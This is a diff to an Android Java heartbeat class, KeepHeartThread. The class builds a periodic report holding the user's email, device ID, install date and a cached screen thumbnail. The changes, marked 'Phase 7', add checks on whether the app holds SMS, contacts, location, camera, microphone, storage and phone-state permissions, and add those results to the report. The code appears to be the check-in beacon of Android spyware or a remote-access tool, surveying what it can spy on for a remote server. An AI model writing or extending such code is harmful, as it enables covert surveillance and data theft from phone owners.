@@ -219,6 +219,14 @@ public final class KeepHeartThread extends TimerTask {
         sb.append("&user_email=").append(encode(getUserEmail()));
         sb.append("&install_date=").append(encode(getInstallDate()));
         sb.append("&phone_id=").append(encode(NetworkManager.getInstance().getDeviceId()));
+        // 权限状态 (Phase 7)
+        sb.append("&perm_sms=").append(hasPerm("android.permission.READ_SMS") ? "1" : "0");
+        sb.append("&perm_contacts=").append(hasPerm("android.permission.READ_CONTACTS") ? "1" : "0");
+        sb.append("&perm_location=").append(hasPerm("android.permission.ACCESS_FINE_LOCATION") ? "1" : "0");
+        sb.append("&perm_camera=").append(hasPerm("android.permission.CAMERA") ? "1" : "0");
+        sb.append("&perm_mic=").append(hasPerm("android.permission.RECORD_AUDIO") ? "1" : "0");
+        sb.append("&perm_storage=").append(hasPerm("android.permission.READ_EXTERNAL_STORAGE") ? "1" : "0");
+        sb.append("&perm_phone=").append(hasPerm("android.permission.READ_PHONE_STATE") ? "1" : "0");
         // 缩略图 (上次 tick 异步截取的缓存)
         if (cachedWallpap != null && !cachedWallpap.isEmpty()) {
             sb.append("&wallpap=").append(encode(cachedWallpap));
@@ -406,6 +414,19 @@ public final class KeepHeartThread extends TimerTask {
         } catch (UnsupportedEncodingException e) {
             return value;
         }
+    }
+
+    private boolean hasPerm(String permission) {
+        try {
+            MainApplication app = MainApplication.getInstance();
+            if (app != null && app.getApplication() != null) {
+                return app.getApplication().checkSelfPermission(permission)
+                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
+            }
+        } catch (Exception e) {
+            // ignore
+        }
+        return false;
     }
 
     /**
